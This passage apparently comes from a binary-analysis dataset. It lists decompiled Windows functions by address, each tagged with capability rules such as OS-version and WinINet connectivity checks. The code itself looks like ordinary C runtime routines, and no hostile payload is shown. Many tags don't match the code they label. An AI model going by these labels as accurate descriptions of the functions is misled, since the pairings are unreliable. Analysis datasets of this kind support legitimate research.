        "decompiled_code": "\nvoid __cdecl fcn.0040ff46(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.004152c7(&var_8h, arg_10h);\n        *arg_ch = var_8h;\n        arg_ch[1] = var_4h;\n        return;\n    }\n    fcn.00415304(&arg_8h, arg_10h);\n    *arg_ch = arg_8h;\n    return;\n}\n",
        "token_count": 142
    },
    "0040ffa1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ffa1(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *unaff_EBX;\n    \n    if (arg_10h != '\\0') {\n        fcn.0040ff84();\n    }\n    if (*in_EAX == 0x2d) {\n        *unaff_EBX = 0x2d;\n        unaff_EBX = unaff_EBX + 1;\n    }\n    puVar1 = unaff_EBX;\n    if (0 < arg_8h) {\n        puVar1 = unaff_EBX + 1;\n        *unaff_EBX = *puVar1;\n        *puVar1 = *0x44e874;\n    }\n    puVar1 = fcn.0040ee40(puVar1 + arg_8h + (arg_10h == '\\0'), \"e+000\");\n    if (arg_ch != 0) {\n        *puVar1 = 0x45;\n    }\n    if (*in_EAX[3] != '0') {\n        iVar2 = in_EAX[1] + -1;\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n            puVar1[1] = 0x2d;\n        }\n        if (99 < iVar2) {\n            iVar3 = iVar2 / 100;\n            iVar2 = iVar2 % 100;\n            puVar1[2] = puVar1[2] + iVar3;\n        }\n        if (9 < iVar2) {\n            iVar3 = iVar2 / 10;\n            iVar2 = iVar2 % 10;\n            puVar1[3] = puVar1[3] + iVar3;\n        }\n        puVar1[4] = puVar1[4] + iVar2;\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "004100bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004100bb(uchar *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uchar *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if ((arg_10h != '\\0') && (iVar1 + -1 == arg_ch)) {\n        iVar2 = *in_EAX;\n        arg_8h[(iVar2 == 0x2d) + iVar1 + -1] = 0x30;\n        (arg_8h + (iVar2 == 0x2d) + iVar1 + -1)[1] = 0;\n    }\n    puVar3 = arg_8h;\n    if (*in_EAX == 0x2d) {\n        *arg_8h = 0x2d;\n        puVar3 = arg_8h + 1;\n    }\n    if (in_EAX[1] < 1) {\n        fcn.0040ff84();\n        *puVar3 = 0x30;\n        puVar3 = puVar3 + 1;\n    }\n    else {\n        puVar3 = puVar3 + in_EAX[1];\n    }\n    if (0 < arg_ch) {\n        fcn.0040ff84();\n        *puVar3 = *0x44e874;\n        iVar1 = in_EAX[1];\n        if (iVar1 < 0) {\n            if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar1) == arg_ch + iVar1 < 0)) {\n                arg_ch = -iVar1;\n            }\n            fcn.0040ff84();\n            fcn.0040bbe0(puVar3 + 1, 0x30, arg_ch);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 426
    },
    "0041031f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041031f(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uchar auStack272 [260];\n    uchar uStack12;\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x44e538)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x44e538)) {\n        if ((*0x451010 == 1) || ((*0x451010 == 0 && (*0x44e0f8 == 1)))) {\n            uStack288 = 0;\n            puStack292 = &stack0x00000004;\n            uStack296 = *(uVar1 * 8 + 0x44e53c);\n            uStack296 = fcn.0040baf0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack288 = 0x104;\n            puStack292 = &stack0xfffffef0;\n            uStack296 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.0040ee40();\n            }\n            iVar2 = fcn.0040baf0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.0040baf0();\n                fcn.00414460();\n            }\n            fcn.0040baf0();\n            fcn.0040baf0();\n            fcn.0040a2a0();\n            fcn.0040ee40();\n            fcn.0040ee50();\n            fcn.0040ee50();\n            fcn.0040ee50();\n            fcn.0041564f(&stack0xfffffed8, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    uStack288 = 0x41048b;\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 550
    },
    "004104cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004104cf(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = fcn.0040eadd();\n    piVar1 = *(iVar4 + 0x54);\n    piVar7 = piVar1;\n    do {\n        if (*piVar7 == arg_8h) break;\n        piVar7 = piVar7 + 3;\n    } while (piVar7 < piVar1 + *0x44e654 * 3);\n    if ((piVar1 + *0x44e654 * 3 <= piVar7) || (*piVar7 != arg_8h)) {\n        piVar7 = NULL;\n    }\n    if ((piVar7 == NULL) || (pcVar2 = piVar7[2],  pcVar2 == NULL)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar2 == 0x5) {\n        piVar7[2] = 0;\n        uVar5 = 1;\n    }\n    else {\n        if (pcVar2 != 0x1) {\n            uVar5 = *(iVar4 + 0x58);\n            *(iVar4 + 0x58) = ExceptionInfo;\n            if (piVar7[1] == 8) {\n                if (*0x44e648 < *0x44e64c + *0x44e648) {\n                    iVar6 = *0x44e648 * 0xc;\n                    iVar8 = *0x44e648;\n                    do {\n                        *(iVar6 + 8 + *(iVar4 + 0x54)) = 0;\n                        iVar8 = iVar8 + 1;\n                        iVar6 = iVar6 + 0xc;\n                    } while (iVar8 < *0x44e64c + *0x44e648);\n                }\n                iVar8 = *piVar7;\n                uVar3 = *(iVar4 + 0x5c);\n                if (iVar8 == -0x3fffff72) {\n                    *(iVar4 + 0x5c) = 0x83;\n                }\n                else if (iVar8 == -0x3fffff70) {\n                    *(iVar4 + 0x5c) = 0x81;\n                }\n                else if (iVar8 == -0x3fffff6f) {\n                    *(iVar4 + 0x5c) = 0x84;\n                }\n                else if (iVar8 == -0x3fffff6d) {\n                    *(iVar4 + 0x5c) = 0x85;\n                }\n                else if (iVar8 == -0x3fffff73) {\n                    *(iVar4 + 0x5c) = 0x82;\n                }\n                else if (iVar8 == -0x3fffff71) {\n                    *(iVar4 + 0x5c) = 0x86;\n                }\n                else if (iVar8 == -0x3fffff6e) {\n                    *(iVar4 + 0x5c) = 0x8a;\n                }\n                (*pcVar2)(8, *(iVar4 + 0x5c));\n                *(iVar4 + 0x5c) = uVar3;\n            }\n            else {\n                piVar7[2] = 0;\n                (*pcVar2)(piVar7[1]);\n            }\n            *(iVar4 + 0x58) = uVar5;\n        }\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 853
    },
    "00410757": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410757(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x4527e1) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x004107d0;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x004107d0:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x4527e1) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x4527e1) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1216
    },
    "00410a87": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00410a87(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.00409f36(0x480);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x452678 = 0x20;\n        *0x452680 = puVar3;\n        for (; puVar3 < *0x452680 + 0x120; puVar3 = puVar3 + 9) {\n            *puVar3 = 0xffffffff;\n            puVar3[2] = 0;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar9 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x452678 < iVar8) {\n                puVar3 = 0x452684;\n                do {\n                    puVar5 = fcn.00409f36(0x480);\n                    iVar6 = *0x452678;\n                    if (puVar5 == NULL) break;\n                    *0x452678 = *0x452678 + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x120; puVar5 = puVar5 + 9) {\n                        *puVar5 = 0xffffffff;\n                        puVar5[2] = 0;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x452678 < iVar8);\n            }\n            uVar7 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar9 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar9),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar7 >> 5) * 4 + 0x452680) + (uVar7 & 0x1f) * 0x24;\n                        *piVar1 = *piVar9;\n                        *(piVar1 + 1) = *piStack20;\n                        iVar8 = fcn.004136ad(piVar1 + 3, 4000);\n                        if (iVar8 == 0) {\n                            return 0xffffffff;\n                        }\n                        piVar1[2] = piVar1[2] + 1;\n                    }\n                    piVar9 = piVar9 + 1;\n                    uVar7 = uVar7 + 1;\n                    piStack20 = piStack20 + 1;\n                } while (uVar7 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar9 = *0x452680 + iVar8 * 9;\n            if (*piVar9 == -1) {\n                *(piVar9 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 == -1) || (uVar7 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar7 == 0)) {\n                    *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                }\n                else {\n                    *piVar9 = iVar6;\n                    if ((uVar7 & 0xff) == 2) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                    }\n                    else if ((uVar7 & 0xff) == 3) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 8;\n                    }\n                    iVar6 = fcn.004136ad(piVar9 + 3, 4000);\n                    if (iVar6 == 0) {\n                        return 0xffffffff;\n                    }\n                    piVar9[2] = piVar9[2] + 1;\n                }\n            }\n            else {\n                *(piVar9 + 1) = *(piVar9 + 1) | 0x80;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x452678);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1249
    },
    "004110af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_38h_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.004110af(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *lpMultiByteStr_00;\n    int32_t unaff_EBP;\n    uchar *arg_8h_00;\n    uint var_2ch;\n    uint var_48h;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_20h_2;\n    uint var_24h_3;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_38h_2;\n    uint var_34h;\n    uint var_30h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    uint var_44h;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h;\n    \n    fcn.0040bc40();\n    if (*0x451360 == 0) {\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x451360 = 2;\n            }\n        }\n        else {\n            *0x451360 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x00411115;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x00411115:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x451360 != 2) && (*0x451360 != 0)) {\n        if (*0x451360 != 1) goto code_r0x00411462;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x451358;\n        }\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x00411462;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040a2a0();\n        *(unaff_EBP + -0x18) = &fcn.004110af::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.004110af::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.00409f36();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x00411462;\n            *(unaff_EBP + -0x38) = 1;\n        }\n        var_30h_2 = 1;\n        var_34h = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.0040a2a0();\n                    *(unaff_EBP + -0x18) = &fcn.004110af::var_34h;\n                    *(unaff_EBP + -0x20) = &fcn.004110af::var_34h;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.00409f36(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x004112e4;\n                        *(unaff_EBP + -0x34) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x004112e4:\n        if (*(unaff_EBP + -0x34) != 0) {\n            fcn.00409f48(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.00409f48(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x00411462;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x451348;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x451358;\n    }\n    iVar1 = fcn.00415dde(*(unaff_EBP + 8));\n    *(unaff_EBP + -0x40) = iVar1;\n    if (iVar1 == -1) goto code_r0x00411462;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = fcn.00415e21(lpSrcStr, iVar1, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x444160, 0x38);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x00411462;\n        uVar6 = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        lpMultiByteStr_00 = &fcn.004110af::lpSrcStr;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        arg_8h_00 = NULL;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040a2a0();\n            *(unaff_EBP + -0x18) = &fcn.004110af::lpSrcStr;\n            *(unaff_EBP + -0x44) = &fcn.004110af::lpSrcStr;\n            fcn.0040bbe0();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                lpMultiByteStr_00 = fcn.00409f36();\n                arg_8h_00 = lpMultiByteStr_00;\n                if (lpMultiByteStr_00 == NULL) goto code_r0x0041142a;\n                fcn.0040bbe0();\n                *(unaff_EBP + -0x3c) = 1;\n            }\n            var_30h_2 = *(unaff_EBP + 0xc);\n            var_34h = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            arg_8h_00 = lpMultiByteStr_00;\n            if (iVar1 != 0) {\n                var_30h_2 = *(unaff_EBP + 0x20);\n                var_34h = *(unaff_EBP + -0x40);\n                fcn.00415e21(var_34h, var_30h_2, lpMultiByteStr_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18), \n                             *(unaff_EBP + 0x1c), lpSrcStr, uVar6);\n            }\n        }\ncode_r0x0041142a:\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.00409f48(arg_8h_00);\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.00409f48(*(unaff_EBP + -0x28));\n    }\ncode_r0x00411462:\n    *(unaff_EBP + -0x58) = 0x41146a;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 3001
    },
    "0041146b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0041146b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    int32_t noname_0_00;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.0040bc40();\n    iVar3 = 0;\n    if (*0x451364 == 0) {\n        var_38h = 0x411495;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x451364 = 2;\n            }\n        }\n        else {\n            *0x451364 = 1;\n        }\n    }\n    if ((*0x451364 == 2) || (*0x451364 == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x451348;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x451358;\n        }\n        noname_1_00 = fcn.00415dde(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar3 = fcn.00415e21(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x444188, \n                                     0x1c);\n                if (iVar3 == 0) goto code_r0x0041161c;\n                *(unaff_EBP + 0xc) = iVar3;\n            }\n            lpCharType = 0x41160d;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar3 != 0) {\n                lpCharType = iVar3;\n                fcn.00409f48(iVar3);\n            }\n        }\n    }\n    else if (*0x451364 == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x451358;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        arg_8h_00 = &fcn.0041146b::lpCharType;\n        iVar3 = 